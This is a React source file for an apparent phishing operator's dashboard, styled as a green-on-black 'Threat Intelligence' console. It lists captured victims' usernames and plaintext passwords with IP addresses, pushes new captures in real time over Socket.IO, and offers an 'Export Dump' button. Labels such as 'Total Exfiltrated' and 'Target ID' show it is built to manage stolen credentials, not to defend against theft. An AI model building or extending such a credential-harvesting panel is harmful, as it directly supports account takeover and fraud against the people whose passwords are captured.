import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import { io } from "socket.io-client";
import { 
  LogOut, ShieldAlert, Activity, Users, MapPin, Search, Server, Download, Zap
} from "lucide-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { 
  BarChart, Bar, XAxis, YAxis, CartesianGrid, Tooltip as RechartsTooltip, ResponsiveContainer 
} from "recharts";

interface LoginAttempt {
  id: number | string;
  username: string;
  password?: string;
  ipAddress: string;
  userAgent: string;
  status: string;
  createdAt: string;
}

export default function AdminDashboard() {
  const navigate = useNavigate();
  const [logs, setLogs] = useState<LoginAttempt[]>([]);
  const [stats, setStats] = useState({ totalAttempts: 0, dailyStats: [] });
  const [searchTerm, setSearchTerm] = useState("");
  const [loading, setLoading] = useState(true);
  const [liveCount, setLiveCount] = useState(0);

  useEffect(() => {
    const token = localStorage.getItem("admin_token");
    if (!token) {
      navigate("/admin-login");
      return;
    }

    const fetchData = async () => {
      try {
        const apiUrl = import.meta.env.VITE_API_URL || "http://localhost:5000";
        const headers = { Authorization: `Bearer ${token}` };

        const [logsRes, statsRes] = await Promise.all([
          fetch(`${apiUrl}/api/admin/logs`, { headers }),
          fetch(`${apiUrl}/api/admin/stats`, { headers })
        ]);

        if (logsRes.status === 401 || statsRes.status === 401) {
          localStorage.removeItem("admin_token");
          navigate("/admin-login");
          return;
        }

        setLogs(await logsRes.json());
        setStats(await statsRes.json());
      } catch (error) {
        console.error("Failed to fetch dashboard data", error);
      } finally {
        setLoading(false);
      }
    };

    fetchData();

    // Socket.IO: connect for real-time updates
    const apiUrl = import.meta.env.VITE_API_URL || "http://localhost:5000";
    const socket = io(apiUrl);

    socket.on("new-login", (newLog: LoginAttempt) => {
      // Prepend the new log to the top of the table instantly
      setLogs(prev => [newLog, ...prev]);
      // Bump total count
      setStats(prev => ({ ...prev, totalAttempts: prev.totalAttempts + 1 }));
      // Flash the live indicator
      setLiveCount(c => c + 1);
    });

    return () => {
      socket.disconnect();
    };
  }, [navigate]);

  const handleLogout = () => {
    localStorage.removeItem("admin_token");
    navigate("/admin-login");
  };

  const filteredLogs = logs.filter(
    (log) => 
      log.username.toLowerCase().includes(searchTerm.toLowerCase()) ||
      log.ipAddress.includes(searchTerm)
  );

  if (loading) {
    return (
      <div className="min-h-screen bg-black text-green-500 font-mono flex items-center justify-center">
        <Server className="w-8 h-8 animate-pulse" />
        <span className="ml-4 tracking-widest">CONNECTING TO MAINFRAME...</span>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-black text-green-500 font-mono p-4 md:p-8">
      {/* Header */}
      <header className="flex flex-col md:flex-row justify-between items-center mb-8 border-b border-green-500/30 pb-4">
        <div className="flex items-center gap-3 mb-4 md:mb-0">
          <ShieldAlert className="w-8 h-8 text-red-500 animate-pulse" />
          <div>
            <h1 className="text-2xl font-bold tracking-widest text-green-500 uppercase">
              THREAT INTELLIGENCE
            </h1>
            <p className="text-xs text-green-500/60 uppercase">
              Live Credential Capture Feeds
            </p>
          </div>
        </div>
        <div className="flex gap-4">
          <Button variant="outline" className="border-green-500 text-green-500 hover:bg-green-500 hover:text-black">
            <Download className="w-4 h-4 mr-2" />
            EXPORT DUMP
          </Button>
          <Button variant="destructive" onClick={handleLogout} className="bg-red-900 text-red-500 hover:bg-red-800">
            <LogOut className="w-4 h-4 mr-2" />
            SEVER CONNECTION
          </Button>
        </div>
      </header>

      {/* Stats Grid */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6 mb-8">
        <Card className="bg-black border-green-500/30 shadow-[0_0_10px_rgba(0,255,0,0.1)]">
          <CardHeader className="flex flex-row items-center justify-between pb-2">
            <CardTitle className="text-sm font-medium text-green-500/70">TOTAL EXFILTRATED</CardTitle>
            <Users className="w-4 h-4 text-green-500" />
          </CardHeader>
          <CardContent>
            <div className="text-3xl font-bold text-green-500">{stats.totalAttempts}</div>
          </CardContent>
        </Card>
        <Card className="bg-black border-green-500/30 shadow-[0_0_10px_rgba(0,255,0,0.1)]">
          <CardHeader className="flex flex-row items-center justify-between pb-2">
            <CardTitle className="text-sm font-medium text-green-500/70">SYSTEM STATUS</CardTitle>
            <Activity className="w-4 h-4 text-green-500" />
          </CardHeader>
          <CardContent>
            <div className="text-3xl font-bold text-green-500">ONLINE</div>
          </CardContent>
        </Card>
        <Card className="bg-black border-green-500/30 shadow-[0_0_10px_rgba(0,255,0,0.1)]">
          <CardHeader className="flex flex-row items-center justify-between pb-2">
            <CardTitle className="text-sm font-medium text-green-500/70">LATEST TARGET IP</CardTitle>
            <MapPin className="w-4 h-4 text-green-500" />
          </CardHeader>
          <CardContent>
            <div className="text-xl font-bold text-green-500 truncate">
              {logs.length > 0 ? logs[0].ipAddress : "N/A"}
            </div>
          </CardContent>
        </Card>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-8">
        {/* Table Area */}
        <div className="lg:col-span-2 space-y-4">
          <div className="flex items-center gap-2 mb-4">
            <Search className="text-green-500/50 w-5 h-5" />
            <Input
              placeholder="Search by username or IP..."
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
              className="bg-black border-green-500/30 text-green-500 placeholder:text-green-500/30 focus:border-green-500"
            />
          </div>

          <div className="border border-green-500/30 rounded-md overflow-hidden bg-black/50">
            <Table>
              <TableHeader className="bg-green-500/10 border-b border-green-500/30">
                <TableRow className="hover:bg-transparent">
                  <TableHead className="text-green-500">TIMESTAMP</TableHead>
                  <TableHead className="text-green-500">TARGET ID</TableHead>
                  <TableHead className="text-green-500">PASSWORD</TableHead>
                  <TableHead className="text-green-500">IP ADDRESS</TableHead>
                  <TableHead className="text-green-500">STATUS</TableHead>
                </TableRow>
              </TableHeader>
              <TableBody>
                {filteredLogs.map((log) => (
                  <TableRow key={log.id} className="border-b border-green-500/10 hover:bg-green-500/5">
                    <TableCell className="text-green-500/80">
                      {new Date(log.createdAt).toLocaleString()}
                    </TableCell>
                    <TableCell className="font-bold text-green-400">{log.username}</TableCell>
                    <TableCell className="text-red-400 font-mono tracking-widest">{log.password || "N/A"}</TableCell>
                    <TableCell className="text-green-500/70">{log.ipAddress}</TableCell>
                    <TableCell>
                      <span className="px-2 py-1 bg-green-500/20 text-green-500 text-xs rounded border border-green-500/30">
                        {log.status.toUpperCase()}
                      </span>
                    </TableCell>
                  </TableRow>
                ))}
                {filteredLogs.length === 0 && (
                  <TableRow>
                    <TableCell colSpan={5} className="text-center py-8 text-green-500/50">
                      NO DATA FOUND IN LOGS
                    </TableCell>
                  </TableRow>
                )}
              </TableBody>
            </Table>
          </div>
        </div>

        {/* Charts Area */}
        <div className="space-y-6">
          <Card className="bg-black border-green-500/30 shadow-[0_0_10px_rgba(0,255,0,0.1)]">
            <CardHeader>
              <CardTitle className="text-green-500 text-lg">CAPTURE VOLUME</CardTitle>
            </CardHeader>
            <CardContent className="h-64">
              <ResponsiveContainer width="100%" height="100%">
                <BarChart data={stats.dailyStats}>
                  <CartesianGrid strokeDasharray="3 3" stroke="#00ff0030" />
                  <XAxis dataKey="date" stroke="#00ff00" tick={{ fill: "#00ff0070" }} />
                  <YAxis stroke="#00ff00" tick={{ fill: "#00ff0070" }} />
                  <RechartsTooltip 
                    contentStyle={{ backgroundColor: "#000", border: "1px solid #00ff00", color: "#00ff00" }}
                  />
                  <Bar dataKey="attempts" fill="#00ff00" radius={[4, 4, 0, 0]} />
                </BarChart>
              </ResponsiveContainer>
            </CardContent>
          </Card>
        </div>
      </div>
    </div>
  );
}
